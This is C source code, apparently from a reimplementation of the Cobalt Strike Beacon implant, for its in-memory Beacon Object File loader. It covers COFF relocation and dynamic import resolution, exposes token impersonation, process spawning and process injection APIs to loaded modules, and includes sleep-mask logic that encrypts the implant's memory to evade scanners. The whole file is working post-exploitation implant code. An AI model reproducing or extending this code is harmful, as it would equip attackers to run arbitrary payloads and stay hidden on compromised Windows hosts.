/*
 * Beacon Object File Format (BOFFs)
 *
 * OK, this is just a PE/COFF file parsed and linked by Cobalt Strike's Beacon. It's nothing too special.
 * This is the code to make all of it work though.
 */
#include <Windows.h>
#include <stdio.h>
#include <string.h>
#include <limits.h>
#include <stddef.h>
#include "commands.h"
#include "beacon.h"
#include "parse.h"
#include "inject.h"
#include "bformat.h"
#include "datastore.h"
#include "gargleint.h"
#include "sleepmask_bofwin.h"

#define RELOC_ENDTABLE 0
#define RELOC_ADDR64   1
#define RELOC64_ADDR32   2  /* IMAGE_REL_AMD64_ADDR32 */
#define RELOC64_ADDR32NB 3  /* IMAGE_REL_AMD64_ADDR32NB — sleep-mask BOF */
#define RELOC_ADDR32   6
#define RELOC_REL32    20
#define RELOC64_REL32_0  4
#define RELOC64_REL32_1  5
#define RELOC64_REL32_2  6
#define RELOC64_REL32_3  7
#define RELOC64_REL32_4  8
#define RELOC64_REL32_5  9

#define SYMBOL_RDATA         1024
#define SYMBOL_DATA          1025
#define SYMBOL_TEXT          1026
#define SYMBOL_DYNAMICF      1027
#define SYMBOL_END           1028
#define SYMBOL_XDATA         1029
#define SYMBOL_PDATA         1030
#define SYMBOL_BSS           1031


static void postmsgf(int type, char * fmt, ...) {
	va_list va;
	int     est;
	char *  buff;

	/* how much data do we expect to stuff into this buffer? */
	va_start(va, fmt);
	est = _vscprintf(fmt, va);
	va_end(va);

	/* let's sanity check the data */
	if (est <= 0)
		return;

	/* malloc data for our output... */
	buff      = (char *)malloc(est+1);
	buff[est] = 0;

	/* build up our output. */
	va_start(va, fmt);
	vsprintf_s(buff, est+1, fmt, va);
	va_end(va);

	/* post it */
	command_shell_callback(buff, est, type);

	/* clear&free our memory */
	memset(buff, 0, est);
	free(buff);
}

static BOOL use_token_a(HANDLE token) {
	BOOL result;
	char * mem = (char*)malloc(256);
	memset(mem, 0, 256);

	result = use_token(token, mem, 256);

	/* clear&free our memory */
	memset(mem, 0, 256);
	free(mem);

	return result;
}

static void postmsg(int type, char * msg, int len) {
	command_shell_callback(msg, len, type);
}

void spawn_populate(BOOL x86, char * cmdbuff);

static void getspawnproc(BOOL x86, char * buff, int len) {
	char proc[256];
	spawn_populate(x86, proc);

	if (len < 256) {
		memcpy(buff, proc, len);
	}
	else {
		memcpy(buff, proc, 256);
	}
}

static void inject_temp_process(PROCESS_INFORMATION * pi, char * payload, int plen, int off, char * arg, int alen) {
	inject_process_logic(pi, pi->hProcess, pi->dwProcessId, payload, plen, off, arg, alen);
}

static void inject_explicit_process(HANDLE hProcess, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len) {
	inject_process_logic(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
}

typedef struct {
	int   section; /* 4.9: which section the reloc lives in (TEXT/DATA/PDATA) */
	short type;
	short symbol;
	int   offset;
	int   offset_in_section;
} OBJ_RELOC;

typedef struct {
	/* APIs to resolve Win32 modules */
	HMODULE (WINAPI *LoadLibraryA)(__in LPCSTR file);
	BOOL    (WINAPI *FreeLibrary)(HMODULE hLibModule);
	FARPROC (WINAPI *GetProcAddress)(HMODULE hModule, LPCSTR proc);
	HMODULE (WINAPI *GetModuleHandleA)(LPCSTR);

	/* data parser API */
	void    (*BeaconDataParse)(datap *, char * buffer, int size);
	char *  (*BeaconDataPtr)(datap *, int size);
	int     (*BeaconDataInt)(datap *);
	short   (*BeaconDataShort)(datap *);
	int     (*BeaconDataLength)(datap *);
	char *  (*BeaconDataExtract)(datap *, int * size);

	/* string builder API */
	void      (*BeaconFormatAlloc)(formatp * format, int maxsz);
	void      (*BeaconFormatReset)(formatp * format);
	void      (*BeaconFormatAppend)(formatp * format, char * text, int len);
	void      (*BeaconFormatPrintf)(formatp * format, char * fmt, ...);
	char *    (*BeaconFormatToString)(formatp * format, int * size);
	void      (*BeaconFormatFree)(formatp * format);
	void      (*BeaconFormatInt)(formatp * format, int value);

	/* Output Functions */
	void    (*BeaconOutput)(int type, char * msg, int len);
	void    (*BeaconPrintf)(int type, char * fmt, ...);
	void    (*BeaconErrorD)(int type, int arg);
	void    (*BeaconErrorDD)(int type, int arg, int arg2);
	void    (*BeaconErrorNA)(int type);

	/* Token Functions */
	BOOL    (*BeaconUseToken)(HANDLE token);
	void    (*BeaconRevertToken)();
	BOOL    (*BeaconIsAdmin)();

	/* Spawn and Inject */
	void   (*BeaconGetSpawnTo)(BOOL x86, char * buffer, int length);
	void   (*BeaconInjectProcess)(HANDLE hProc, int pid, char * payload, int p_len, int p_offset, char * arg, int a_len);
	void   (*BeaconInjectTemporaryProcess)(PROCESS_INFORMATION * pInfo, char * payload, int p_len, int p_offset, char * arg, int a_len);
	BOOL   (*BeaconSpawnTemporaryProcess)(BOOL x86, BOOL ignoreToken, STARTUPINFO * si, PROCESS_INFORMATION * pInfo);
	void   (*BeaconCleanupProcess)(PROCESS_INFORMATION * pInfo);

	/* Utility Functions */
	BOOL   (*toWideChar)(char * src, wchar_t * dst, int max);

	/* 4.9 BOF APIs — order matches resources/bapi.txt */
	void   (*BeaconInformation)(BEACON_INFO * info);
	BOOL   (*BeaconAddValue)(const char * key, void * ptr);
	void * (*BeaconGetValue)(const char * key);
	BOOL   (*BeaconRemoveValue)(const char * key);
	PDATA_STORE_OBJECT (*BeaconDataStoreGetItem)(size_t index);
	void   (*BeaconDataStoreProtectItem)(size_t index);
	void   (*BeaconDataStoreUnprotectItem)(size_t index);
	size_t (*BeaconDataStoreMaxEntries)(void);
	char * (*BeaconGetCustomUserData)(void);

	/* our other pointers: 4.12 Dynamic Import. The named API fields above
	 * keep their offsets (BOFs compile against beacon.h field names); this
	 * tail now points at a BOF_SLOT_TABLE whose chunked slots have stable
	 * addresses for the lifetime of the run, so import count is unlimited
	 * (4.9: fixed other[64]; 4.10 official: 128). */
	void * other;
} BOFF_FUNCTIONS;

/* chunked dynamic-import slot table: chunk addresses never move once
 * allocated (relocations patch references to slot addresses), while the
 * chunk-pointer array itself may realloc - nothing points into it. */
#define BOF_SLOT_CHUNK 64

typedef struct _BOF_SLOT_TABLE {
	void *** chunks;
	int       nchunks;
	int       cap;
	int       used;
} BOF_SLOT_TABLE;

void bof_free_slot_table(BOFF_FUNCTIONS * f) {
	BOF_SLOT_TABLE * t = (BOF_SLOT_TABLE *)f->other;
	int i;
	if (t == NULL)
		return;
	for (i = 0; i < t->nchunks; i++)
		free(t->chunks[i]);
	if (t->chunks != NULL)
		free(t->chunks);
	free(t);
	f->other = NULL;
}

void * function_slot(BOFF_FUNCTIONS * f, void * ptr) {
	BOF_SLOT_TABLE * t;
	int g;

	if (f->other == NULL) {
		t = (BOF_SLOT_TABLE *)malloc(sizeof(BOF_SLOT_TABLE));
		if (t == NULL)
			return NULL;
		memset(t, 0, sizeof(BOF_SLOT_TABLE));
		f->other = (void *)t;
	}
	t = (BOF_SLOT_TABLE *)f->other;

	/* already assigned? hand back the same slot (dedup by pointer) */
	for (g = 0; g < t->used; g++) {
		void ** chunk = t->chunks[g / BOF_SLOT_CHUNK];
		if (chunk[g % BOF_SLOT_CHUNK] == ptr)
			return &chunk[g % BOF_SLOT_CHUNK];
	}

	/* need a new chunk? */
	if (t->used == t->nchunks * BOF_SLOT_CHUNK) {
		void ** chunk = (void **)malloc(sizeof(void *) * BOF_SLOT_CHUNK);
		void *** grown;
		int newcap;
		if (chunk == NULL)
			return NULL;
		memset(chunk, 0, sizeof(void *) * BOF_SLOT_CHUNK);
		newcap = t->cap == 0 ? 4 : t->cap * 2;
		if (t->nchunks == t->cap) {
			grown = (void ***)realloc(t->chunks, sizeof(void **) * newcap);
			if (grown == NULL) {
				free(chunk);
				return NULL;
			}
			t->chunks = grown;
			t->cap = newcap;
		}
		t->chunks[t->nchunks++] = chunk;
	}

	g = t->used++;
	t->chunks[g / BOF_SLOT_CHUNK][g % BOF_SLOT_CHUNK] = ptr;
	return &t->chunks[g / BOF_SLOT_CHUNK][g % BOF_SLOT_CHUNK];
}

void setup_functions(BOFF_FUNCTIONS * f) {
	/* clear all of these pointers, please (also NULLs f->other) */
	memset(f, 0, sizeof(BOFF_FUNCTIONS));

	/* setup some of our fixed APIs */
	f->LoadLibraryA      = LoadLibraryA;
	f->FreeLibrary       = FreeLibrary;
	f->GetProcAddress    = GetProcAddress;
	f->GetModuleHandleA  = GetModuleHandleA;

	/* data parser API */
	f->BeaconDataParse   = data_init;
	f->BeaconDataPtr     = data_ptr;
	f->BeaconDataInt     = reinterpret_cast<int (*)(datap *)>(data_int);
	f->BeaconDataShort   = reinterpret_cast<short (*)(datap*)>(data_short);
	f->BeaconDataLength  = data_length;
	f->BeaconDataExtract = data_ptr_extract;

	/* beacon format API */
	f->BeaconFormatAlloc    = bformat_init;
	f->BeaconFormatReset    = bformat_reset;
	f->BeaconFormatPrintf   = bformat_printf;
	f->BeaconFormatAppend   = bformat_copy;
	f->BeaconFormatFree     = bformat_free;
	f->BeaconFormatToString = bformat_tostring;
	f->BeaconFormatInt      = bformat_int;

	/* our output function */
	f->BeaconOutput      = postmsg;
	f->BeaconPrintf      = postmsgf;
	f->BeaconErrorD      = post_error_d;
	f->BeaconErrorDD     = post_error_dd;
	f->BeaconErrorNA     = post_error_na;

	/* token API */
	f->BeaconUseToken    = use_token_a;
	f->BeaconIsAdmin     = is_admin;
	f->BeaconRevertToken = command_rev2self;

	/* spawn and inject APIs */
	f->BeaconGetSpawnTo             = getspawnproc;
	f->BeaconCleanupProcess         = cleanupProcess;
	f->BeaconInjectProcess          = inject_explicit_process;
	f->BeaconSpawnTemporaryProcess = spawn_patsy;
	f->BeaconInjectTemporaryProcess = inject_temp_process;

	/* utility functions */
	f->toWideChar                   = toWideChar;

	f->BeaconInformation            = BeaconInformation;
	f->BeaconAddValue               = BeaconAddValue;
	f->BeaconGetValue               = BeaconGetValue;
	f->BeaconRemoveValue            = BeaconRemoveValue;
	f->BeaconDataStoreGetItem       = BeaconDataStoreGetItem;
	f->BeaconDataStoreProtectItem   = BeaconDataStoreProtectItem;
	f->BeaconDataStoreUnprotectItem = BeaconDataStoreUnprotectItem;
	f->BeaconDataStoreMaxEntries    = BeaconDataStoreMaxEntries;
	f->BeaconGetCustomUserData      = BeaconGetCustomUserData;
}

/*
 * These get somewhat complicated. Here's what the variables mean:
 *
 * execsrc - the current source of our .text section/executable code. We need to lift offsets from this memory
 * execdst - the planned destination of our .text section/executable code. It may not be populated yet. But, we may need to calculate offsets relative to it.
 * symbol  - a pointer to the symbol we're processing a relocation for.
 *
 * Return value: if value is false, relocation process failed and the BOFF should not execute. This function reports its own errors.
 */
BOOL process_reloc(OBJ_RELOC * reloc, char * execsrc, char * execdst, char * symbol, int soff, char * imgbase) {
#if defined _M_IX86
	(void)imgbase;
	if (reloc->type == RELOC_ADDR32) {
		DWORD addr, offset, rip;

		memcpy(&offset, execsrc + reloc->offset, 4);
		addr = (DWORD)symbol + (DWORD)offset + soff;
		memcpy(execsrc + reloc->offset, &addr, 4);

		return TRUE;
	}
	else if (reloc->type == RELOC_REL32) {
		DWORD addr, offset, rip;

		/* calculate the RIP of where this data will be ref'd from */
		rip = (DWORD)execdst + reloc->offset + 4;

		/* calculate the location of our rdata */
		memcpy(&offset, execsrc + reloc->offset, 4);
		addr = (DWORD)symbol + (DWORD)offset + soff;

		/* figure out the difference between rip and addr */
		addr = addr - rip;

		/* copy it back in... */
		memcpy(execsrc + reloc->offset, &addr, 4);

		return TRUE;
	}
#elif defined _M_X64
	if (reloc->type == RELOC_ADDR64) {
		UINT64 addr, offset;
		memcpy(&offset, execsrc + reloc->offset, 8);
		addr = (UINT64)(ULONG_PTR)symbol + offset + (UINT64)(ULONG_PTR)soff;
		memcpy(execsrc + reloc->offset, &addr, 8);
		return TRUE;
	}
	else if (reloc->type == RELOC64_ADDR32NB) {
		/* IMAGE_REL_AMD64_ADDR32NB: 32-bit RVA from the BOF mapping base.
		 * sleepmask.x64.o uses this only in .pdata (RUNTIME_FUNCTION). */
		DWORD addend, rva;
		UINT64 target, basev;
		if (imgbase == NULL) {
			post_error_d(0x4f, reloc->type);
			return FALSE;
		}
		memcpy(&addend, execsrc + reloc->offset, 4);
		target = (UINT64)(ULONG_PTR)symbol + addend + (UINT64)(ULONG_PTR)soff;
		basev = (UINT64)(ULONG_PTR)imgbase;
		if (target < basev || (target - basev) > 0xFFFFFFFFULL) {
			post_error_na(0x4d);
			return FALSE;
		}
		rva = (DWORD)(target - basev);
		memcpy(execsrc + reloc->offset, &rva, 4);
		if (execdst != NULL && execdst != execsrc)
			memcpy(execdst + reloc->offset, &rva, 4);
		return TRUE;
	}
	else if (reloc->type >= RELOC64_REL32_0 && reloc->type <= RELOC64_REL32_5) {
		char * rip, * fsymbol;
		DWORD offset, addr;
		INT64 check;

		/* calculate the RIP of where this data will be ref'd from */
		rip = (char *)execdst + reloc->offset + reloc->type;

				/* OK, this is confusing, but... here goes... RELOC64_REL32_0 means we want
				 * the RIP at the end of this total encoded instruction AND our offset is
				 * the last 4 bytes of this encoded instruction. The other offsets after 0
				 * mean there are additional bytes within this encoded instruction and our
				 * relocation offset is tucked into the middle of that instruction. We just
				 * treat reloc->type as a offset to the next instruction following where our
				 * patched relocation offset begins. */

		/* calculate the location of our rdata */
		memcpy(&offset, execsrc + reloc->offset, 4);
		fsymbol = (char *)symbol + offset + soff;

		/* figure out the difference between rip and addr */
		addr = (DWORD)((char *)fsymbol - (char *)rip);

		/* verify that our rip/addr offset can fit in 4b. If it can't, we have a problem and we need to bail */
		check = (INT64)fsymbol - (INT64)rip;

		if (check > INT_MAX || check < INT_MIN) {
			//dlog("0x4d (reloction): symbol@ %p code@ %p  distance: %p", fsymbol, rip, check);
			post_error_na(0x4d);
			return FALSE;
		}

		/* copy it back in... */
		memcpy(execsrc + reloc->offset, &addr, 4);

		return TRUE;
	}
#endif
	else {
		post_error_d(0x4f, reloc->type);
		return FALSE;
	}
}

//void print_reloc(OBJ_RELOC * r) {
	//dlog("Reloc[type: %d, symbol: %d, offset: %d, offset_in_section: %d]", r->type, r->symbol, r->offset, r->offset_in_section);
//}

static char * bof_section_base(int id, char * text, char * rdata, char * data, char * xdata, char * pdata, char * bss) {
	switch (id) {
	case SYMBOL_RDATA: return rdata;
	case SYMBOL_DATA:  return data;
	case SYMBOL_TEXT:  return text;
	case SYMBOL_XDATA: return xdata;
	case SYMBOL_PDATA: return pdata;
	case SYMBOL_BSS:   return bss;
	default:           return text;
	}
}

/* length of the section a relocation claims to live in - used to keep the
 * wire-supplied reloc->offset inside the actual section buffer */
static int bof_section_length(int id, int code_len, int rdata_len, int data_len, int xdata_len, int pdata_len, int bss_len) {
	switch (id) {
	case SYMBOL_RDATA: return rdata_len;
	case SYMBOL_DATA:  return data_len;
	case SYMBOL_TEXT:  return code_len;
	case SYMBOL_XDATA: return xdata_len;
	case SYMBOL_PDATA: return pdata_len;
	case SYMBOL_BSS:   return bss_len;
	default:           return code_len;
	}
}

static char * bof_alloc(SIZE_T total, int * how) {
	DWORD perms = setting_short(SETTING_PROCINJ_PERMS_I);
	int allocator = setting_short(SETTING_BOF_ALLOCATOR);
	*how = allocator;
	if (allocator == 1) {
		HANDLE map = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, (DWORD)total, NULL);
		char * p;
		if (map == NULL)
			return NULL;
		/* map RW-only: the view becomes executable via finalize_memory_permissions
		 * before the BOF runs - no need to hold FILE_MAP_EXECUTE (RWX) up front */
		p = (char *)MapViewOfFile(map, FILE_MAP_ALL_ACCESS, 0, 0, total);
		CloseHandle(map);
		return p;
	}
	if (allocator == 2) {
		HANDLE heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
		if (heap == NULL)
			return NULL;
		return (char *)HeapAlloc(heap, HEAP_ZERO_MEMORY, total);
	}
	*how = 0;
	if (perms == 0)
		perms = PAGE_READWRITE;
	return (char *)VirtualAlloc(NULL, total, MEM_RESERVE | MEM_COMMIT, perms);
}

static void bof_free(char * p, int how) {
	if (p == NULL)
		return;
	if (how == 1)
		UnmapViewOfFile(p);
	else if (how == 2)
		return; /* HeapCreate block is not tracked; leak vs double-free. reuse covers this. */
	else
		VirtualFree(p, 0, MEM_RELEASE);
}

static char * bof_cached;
static SIZE_T bof_cached_size;
static int    bof_cached_how;

BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entry, char * args, int alen, int conv) {
	datap parser;
	datap relocsparser;
	datap_buffer code, rdata, data, xdata, pdata, relocs;
	DWORD bssSize;
	BOFF_FUNCTIONS * ftable;
	void(*inlinefunc)(char * buffer, int length);
	char * base;
	char * code_dst;
	char * rdata_dst;
	char * data_dst;
	char * xdata_dst;
	char * pdata_dst;
	char * bss_dst;
	SIZE_T total;
	OBJ_RELOC * reloc;
	BOOL success = FALSE;
#if defined(_M_X64) && defined(BOFWIN_ENABLE)
	BOOL beacon_api_used = FALSE; /* Phase 3: any ftable reloc means the BOF
	                               * can call back into beacon .text - such a
	                               * BOF may never run inside the masked
	                               * window (13.11) */
#endif
	int how = 0;

	ftable = (BOFF_FUNCTIONS *)malloc(sizeof(BOFF_FUNCTIONS));
	if (ftable == NULL)
		return FALSE;
	setup_functions(ftable);

	data_init(&parser, objblob, objlen);
	bssSize = data_int(&parser);
	code = data_extract(&parser);
	rdata = data_extract(&parser);
	data = data_extract(&parser);
	xdata = data_extract(&parser);
	pdata = data_extract(&parser);
	relocs = data_extract(&parser);

	total = (SIZE_T)code.length + rdata.length + data.length + xdata.length + pdata.length + bssSize;
	if (total == 0) {
		free(ftable);
		return FALSE;
	}

	/* the entry offset is wire-supplied and is executed as code_dst + entry -
	 * it must land inside the code section we actually extracted */
	if (entry >= (DWORD)code.length) {
		post_error_d(0x4d, (int)entry);
		free(ftable);
		return FALSE;
	}

	if (setting_short(SETTING_BOF_REUSE_MEMORY) && bof_cached != NULL && bof_cached_size >= total) {
		DWORD oldrw = 0;
		base = bof_cached;
		how = bof_cached_how;
		/* the block idles RW after each run (see the tail of this function);
		 * re-assert RW in case a previous finalize left it RX */
		VirtualProtect(base, bof_cached_size, PAGE_READWRITE, &oldrw);
		memset(base, 0, total);
	}
	else {
		if (bof_cached != NULL && !setting_short(SETTING_BOF_REUSE_MEMORY)) {
			bof_free(bof_cached, bof_cached_how);
			bof_cached = NULL;
			bof_cached_size = 0;
		}
		base = bof_alloc(total, &how);
		if (base == NULL) {
			free(ftable);
			return FALSE;
		}
		bof_cached = base;
		bof_cached_size = total;
		bof_cached_how = how;
	}

	code_dst = base;
	rdata_dst = code_dst + code.length;
	data_dst = rdata_dst + rdata.length;
	xdata_dst = data_dst + data.length;
	pdata_dst = xdata_dst + xdata.length;
	bss_dst = pdata_dst + pdata.length;

	if (code.buffer) memcpy(code_dst, code.buffer, code.length);
	if (rdata.buffer) memcpy(rdata_dst, rdata.buffer, rdata.length);
	if (data.buffer) memcpy(data_dst, data.buffer, data.length);
	if (xdata.buffer) memcpy(xdata_dst, xdata.buffer, xdata.length);
	if (pdata.buffer) memcpy(pdata_dst, pdata.buffer, pdata.length);

	data_init(&relocsparser, relocs.buffer, relocs.length);
	while (TRUE) {
		char * src;
		char * dst;
		char * sym;
		int width;
		int seclen;
		reloc = (OBJ_RELOC *)data_ptr(&relocsparser, sizeof(OBJ_RELOC));
		if (reloc == NULL)
			break;
		if (reloc->symbol == SYMBOL_END) {
			success = TRUE;
			break;
		}
		/* bounds: the patch site must sit wholly inside its own section.
		 * reloc->offset and the section sizes all come off the wire. */
		width = 4;
#if defined _M_X64
		if (reloc->type == RELOC_ADDR64)
			width = 8;
#endif
		seclen = bof_section_length(reloc->section, code.length, rdata.length, data.length, xdata.length, pdata.length, (int)bssSize);
		/* 用减法形式避免 offset+width 的有符号回绕（offset 接近 INT_MAX 时
		   加法回绕为负、上界比较恒假）。 */
		if (reloc->offset < 0 || seclen < width || reloc->offset > seclen - width) {
			post_error_d(0x4d, reloc->offset);
			break;
		}
		src = bof_section_base(reloc->section, code.buffer, rdata.buffer, data.buffer, xdata.buffer, pdata.buffer, bss_dst);
		dst = bof_section_base(reloc->section, code_dst, rdata_dst, data_dst, xdata_dst, pdata_dst, bss_dst);
		if (src == NULL)
			src = code.buffer;
		if (dst == NULL)
			dst = code_dst;

		if (reloc->symbol == SYMBOL_DYNAMICF) {
			char * lib = data_string_asciiz(&relocsparser);
			char * fun = data_string_asciiz(&relocsparser);
			void * ptr;
			void * slot;
			HMODULE mod = GetModuleHandleA(lib);
			if (mod == NULL)
				mod = LoadLibraryA(lib);
			ptr = GetProcAddress(mod, fun);
			if (ptr == NULL) {
				post_error(0x4c, "%s!%s", lib, fun);
				break;
			}
			slot = function_slot(ftable, ptr);
			if (slot == NULL) {
				post_error_na(0x4e);
				break;
			}
			if (!process_reloc(reloc, src, dst, (char *)slot, 0, base))
				break;
		}
		else if (reloc->symbol >= 0 && reloc->symbol < 1024) {
#if defined(_M_X64) && defined(BOFWIN_ENABLE)
			beacon_api_used = TRUE;
#endif
			if (!process_reloc(reloc, src, dst, (char *)ftable + (reloc->symbol * sizeof(char *)), 0, base))
				break;
		}
		else {
			sym = bof_section_base(reloc->symbol, code_dst, rdata_dst, data_dst, xdata_dst, pdata_dst, bss_dst);
			if (!process_reloc(reloc, src, dst, sym, reloc->offset_in_section, base))
				break;
		}
	}

	if (success) {
		/* Relocs patch the extract buffers (execsrc). Copy them onto the
		 * executable mapping before wiping the extracts. */
		if (code.buffer) memcpy(code_dst, code.buffer, code.length);
		if (rdata.buffer) memcpy(rdata_dst, rdata.buffer, rdata.length);
		if (data.buffer) memcpy(data_dst, data.buffer, data.length);
		if (xdata.buffer) memcpy(xdata_dst, xdata.buffer, xdata.length);
		if (pdata.buffer) memcpy(pdata_dst, pdata.buffer, pdata.length);
		if (code.buffer)
			memset(code.buffer, 0, code.length);
		inlinefunc = (void(*)(char * buffer, int length))(code_dst + entry);
		/* finalize_memory_permissions short-circuits when the two PERMS
		 * settings are equal (unconfigured profile: 0 == 0), leaving the BOF
		 * memory plain RW - the mapping view is created without
		 * FILE_MAP_EXECUTE and allocator 0 VirtualAllocs RW. Executing there
		 * DEP-faults the process inside the masked window (observed live:
		 * every sleep_mask-true payload died in its first masked sleep).
		 * Flip to RX ourselves when finalize would skip; the reuse tail
		 * flips the page back to RW after the run. */
		if (setting_short(SETTING_PROCINJ_PERMS_I) == setting_short(SETTING_PROCINJ_PERMS)) {
			DWORD oldx = 0;
			VirtualProtect(base, total, PAGE_EXECUTE_READ, &oldx);
		}
		if (finalize_memory_permissions(base, total)) {
			if (conv == 1) {
				DWORD t = 0;
				BEACON_INFO info;
				static DWORD empty_sections[2] = { 0, 0 };
				if (args != NULL && alen >= (int)sizeof(DWORD))
					memcpy(&t, args, sizeof(DWORD));
				gargle_setup_parms(code_dst, code_dst + code.length, 0);
				beacon_sleep_mask_set_exec(code_dst, (DWORD)code.length, (DWORD)total);
				BeaconInformation(&info);
				if (info.sections == NULL)
					info.sections = empty_sections;
				info.heap_records = track_memory_get_heap_records_to_mask();
				if (info.heap_records != NULL && info.sections != NULL) {
					int r, w;
					for (r = 0, w = 0; ; r++) {
						if (info.heap_records[r].ptr == (char *)info.sections)
							continue;
						if (w != r)
							info.heap_records[w] = info.heap_records[r];
						if (info.heap_records[r].ptr == NULL)
							break;
						w++;
					}
				}
				if (gparms != NULL) {
					gparms->beacon_ptr = info.beacon_ptr;
					gparms->sections = info.sections;
					gparms->heap_records = info.heap_records;
					memcpy(gparms->mask, info.mask, MASK_SIZE);
					/* the info.sections assignment above restored the
					 * generator-published (layout-blind) table - re-derive
					 * the own-PE table or the mask walk lands on our
					 * .pdata and fail-fasts (see docs/SLEEP-MASK-FEEDBACK.md) */
					gargle_own_sections(gparms, NULL, NULL);
				}
				if (gparms == NULL)
					Sleep(t);
				else
					((void (*)(GARGLEP *, void *, DWORD))inlinefunc)(gparms, (void *)Sleep, t);
				beacon_sleep_mask_set_exec(NULL, 0, 0);
			}
			else {
#if defined(_M_X64) && defined(BOFWIN_ENABLE)
				/* Phase 3 masked BOF window (13.11): a Win32-only BOF (no
				 * ftable relocations) runs with the full beacon image +
				 * tracked heap RC4-masked. Lazy gparms init mirrors
				 * gen3_sleep; the nook setting is the same mask switch the
				 * sleep path honours. Any decline (engine, threads,
				 * watchdog) falls back to the plain unmasked call. */
					if (!beacon_api_used && conv == 0 &&
					    setting_int(SETTING_GARGLE_NOOK) != 0 && threadcount == 0) {
						if (gparms == NULL)
							gargle_setup_parms(NULL, NULL, 0);
						if (bofwin_window((void (*)(void *, int))inlinefunc, args, alen, 0))
							command_shell_callback("bofwin window served", 20, CALLBACK_OUTPUT);
						else {
							command_shell_callback("bofwin window declined", 22, CALLBACK_OUTPUT);
							inlinefunc(args, alen);
						}
					}
						else {
							command_shell_callback("bofwin skipped (api/nook/threads)", 32, CALLBACK_OUTPUT);
							inlinefunc(args, alen);
						}
#else
				inlinefunc(args, alen);
#endif
			}
		}
	}

	if (!setting_short(SETTING_BOF_REUSE_MEMORY)) {
		bof_free(base, how);
		if (bof_cached == base) {
			bof_cached = NULL;
			bof_cached_size = 0;
		}
	}
	else {
		/* cached-for-reuse block idles as RW (de-executed): executable only
		 * while a BOF actually runs, writable again for the next load */
		DWORD oldw = 0;
		VirtualProtect(base, total, PAGE_READWRITE, &oldw);
	}
	bof_free_slot_table(ftable);
	memset(ftable, 0, sizeof(*ftable));
	free(ftable);
	return success;
}


/* ====================================================================
 * BOF-PE (4.13 inline-execute-pe; NetSPI/CCob proposal format).
 *
 * A fully linked PE (EXE or DLL) that exports the BOF entry point
 * (conventionally `go`) and may import its Beacon API from a virtual
 * "beacon.dll" - those thunks are plugged straight into our BOFF_FUNCTIONS
 * table exactly like ftable relocations do for COFF BOFs. All other
 * imports resolve through LoadLibraryA/GetProcAddress as usual.
 *
 * Transport reuses command 100: bssSize carries BOFPE_MAGIC, the "code"
 * field carries the whole PE image, and the "relocs" field carries the
 * export name for the entry point. No new opcode, no client/TS protocol
 * change - the client sniffs MZ and packs this shape itself.
 *
 * x64: exception support via RtlAddFunctionTable (.pdata). x86: no
 * SAFESEH/inverted-table registration (v1 runs x86 PEs without SEH).
 * ==================================================================== */
#define BOFPE_MAGIC 0x626F6670   /* "bofp" - must match PostExInlineObject */

typedef struct {
	const char * name;
	size_t       off;
} BOFPE_API_MAP;

/* beacon.dll import name -> BOFF_FUNCTIONS field. Keep in sync with the
 * struct above; unknown names fail with 0x52 so the operator sees them. */
static const BOFPE_API_MAP bofpe_apis[] = {
	{ "LoadLibraryA",                   offsetof(BOFF_FUNCTIONS, LoadLibraryA) },
	{ "FreeLibrary",                    offsetof(BOFF_FUNCTIONS, FreeLibrary) },
	{ "GetProcAddress",                 offsetof(BOFF_FUNCTIONS, GetProcAddress) },
	{ "GetModuleHandleA",               offsetof(BOFF_FUNCTIONS, GetModuleHandleA) },
	{ "BeaconDataParse",                offsetof(BOFF_FUNCTIONS, BeaconDataParse) },
	{ "BeaconDataPtr",                  offsetof(BOFF_FUNCTIONS, BeaconDataPtr) },
	{ "BeaconDataInt",                  offsetof(BOFF_FUNCTIONS, BeaconDataInt) },
	{ "BeaconDataShort",                offsetof(BOFF_FUNCTIONS, BeaconDataShort) },
	{ "BeaconDataLength",               offsetof(BOFF_FUNCTIONS, BeaconDataLength) },
	{ "BeaconDataExtract",              offsetof(BOFF_FUNCTIONS, BeaconDataExtract) },
	{ "BeaconFormatAlloc",              offsetof(BOFF_FUNCTIONS, BeaconFormatAlloc) },
	{ "BeaconFormatReset",              offsetof(BOFF_FUNCTIONS, BeaconFormatReset) },
	{ "BeaconFormatAppend",             offsetof(BOFF_FUNCTIONS, BeaconFormatAppend) },
	{ "BeaconFormatPrintf",             offsetof(BOFF_FUNCTIONS, BeaconFormatPrintf) },
	{ "BeaconFormatToString",           offsetof(BOFF_FUNCTIONS, BeaconFormatToString) },
	{ "BeaconFormatFree",               offsetof(BOFF_FUNCTIONS, BeaconFormatFree) },
	{ "BeaconFormatInt",                offsetof(BOFF_FUNCTIONS, BeaconFormatInt) },
	{ "BeaconOutput",                   offsetof(BOFF_FUNCTIONS, BeaconOutput) },
	{ "BeaconPrintf",                   offsetof(BOFF_FUNCTIONS, BeaconPrintf) },
	{ "BeaconErrorD",                   offsetof(BOFF_FUNCTIONS, BeaconErrorD) },
	{ "BeaconErrorDD",                  offsetof(BOFF_FUNCTIONS, BeaconErrorDD) },
	{ "BeaconErrorNA",                  offsetof(BOFF_FUNCTIONS, BeaconErrorNA) },
	{ "BeaconUseToken",                 offsetof(BOFF_FUNCTIONS, BeaconUseToken) },
	{ "BeaconRevertToken",              offsetof(BOFF_FUNCTIONS, BeaconRevertToken) },
	{ "BeaconIsAdmin",                  offsetof(BOFF_FUNCTIONS, BeaconIsAdmin) },
	{ "BeaconGetSpawnTo",               offsetof(BOFF_FUNCTIONS, BeaconGetSpawnTo) },
	{ "BeaconInjectProcess",            offsetof(BOFF_FUNCTIONS, BeaconInjectProcess) },
	{ "BeaconInjectTemporaryProcess",   offsetof(BOFF_FUNCTIONS, BeaconInjectTemporaryProcess) },
	{ "BeaconSpawnTemporaryProcess",    offsetof(BOFF_FUNCTIONS, BeaconSpawnTemporaryProcess) },
	{ "BeaconCleanupProcess",           offsetof(BOFF_FUNCTIONS, BeaconCleanupProcess) },
	{ "toWideChar",                     offsetof(BOFF_FUNCTIONS, toWideChar) },
	{ "BeaconInformation",              offsetof(BOFF_FUNCTIONS, BeaconInformation) },
	{ "BeaconAddValue",                 offsetof(BOFF_FUNCTIONS, BeaconAddValue) },
	{ "BeaconGetValue",                 offsetof(BOFF_FUNCTIONS, BeaconGetValue) },
